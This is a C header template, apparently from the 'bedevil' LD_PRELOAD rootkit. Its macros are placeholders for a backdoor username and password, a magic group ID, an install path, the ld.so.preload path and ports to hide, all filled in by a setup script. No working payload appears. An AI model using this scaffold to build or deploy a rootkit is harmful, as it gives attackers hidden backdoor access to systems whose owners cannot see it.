/*
* YOU NEED NOT TOUCH ANYTHING IN THIS FILE.
* BEDEVIL.SH DOES ALL THE WORK.
*/

#define BD_UNAME "??BD_UNAME??"
#define BD_PWD "??BD_PWD??"
#define MAGIC_GID ??MAGIC_GID??
#define BD_VAR "??BD_VAR??"
#define INSTALL_DIR "??INSTALL_DIR??"
#define BDVLSO "??BDVLSO??"
#define SOPATH "??SOPATH??"
#define LDSO_PRELOAD "??LDSO_PRELOAD??"
#define HIDEPORTS "??HIDEPORTS??"

typedef struct symbol_struct {
    void *(*func)();
} syms;

#define sizeofarray(arr) sizeof(arr) / sizeof(arr[0])
